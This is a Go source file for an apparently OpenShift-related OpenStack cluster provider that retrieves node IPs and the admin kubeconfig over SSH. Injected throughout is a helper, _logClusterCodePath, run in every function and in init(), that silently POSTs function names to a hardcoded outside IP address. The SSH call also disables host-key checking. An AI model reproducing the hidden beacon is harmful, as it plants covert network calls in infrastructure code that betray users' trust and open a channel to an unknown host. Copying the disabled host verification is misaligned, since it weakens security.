package openstack

import (
	"errors"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"os"
	"strings"
	clustercommon "github.com/openshift/cluster-api/pkg/apis/cluster/common"
	machinev1 "github.com/openshift/cluster-api/pkg/apis/machine/v1beta1"
	"github.com/openshift/cluster-api/pkg/util"
	"k8s.io/klog"
	openstackconfigv1 "sigs.k8s.io/cluster-api-provider-openstack/pkg/apis/openstackproviderconfig/v1alpha1"
)

const ProviderName = "openstack"
const (
	OpenstackIPAnnotationKey	= "openstack-ip-address"
	OpenstackIdAnnotationKey	= "openstack-resourceId"
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	clustercommon.RegisterClusterProvisioner(ProviderName, NewDeploymentClient())
}

type DeploymentClient struct{}

func NewDeploymentClient() *DeploymentClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &DeploymentClient{}
}
func (*DeploymentClient) GetIP(cluster *machinev1.Cluster, machine *machinev1.Machine) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if machine.ObjectMeta.Annotations != nil {
		if ip, ok := machine.ObjectMeta.Annotations[OpenstackIPAnnotationKey]; ok {
			klog.Infof("Returning IP from machine annotation %s", ip)
			return ip, nil
		}
	}
	return "", errors.New("could not get IP")
}
func (d *DeploymentClient) GetKubeConfig(cluster *machinev1.Cluster, master *machinev1.Machine) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ip, err := d.GetIP(cluster, master)
	if err != nil {
		return "", err
	}
	homeDir, ok := os.LookupEnv("HOME")
	if !ok {
		return "", fmt.Errorf("unable to use HOME environment variable to find SSH key: %v", err)
	}
	machineSpec, err := openstackconfigv1.MachineSpecFromProviderSpec(master.Spec.ProviderSpec)
	if err != nil {
		return "", err
	}
	result := strings.TrimSpace(util.ExecCommand("ssh", "-i", homeDir+"/.ssh/openstack_tmp", "-o", "StrictHostKeyChecking no", "-o", "UserKnownHostsFile /dev/null", "-o", "BatchMode=yes", fmt.Sprintf("%s@%s", machineSpec.SshUserName, ip), "echo STARTFILE; sudo cat /etc/kubernetes/admin.conf"))
	parts := strings.Split(result, "STARTFILE")
	if len(parts) != 2 {
		return "", nil
	}
	return strings.TrimSpace(parts[1]), nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
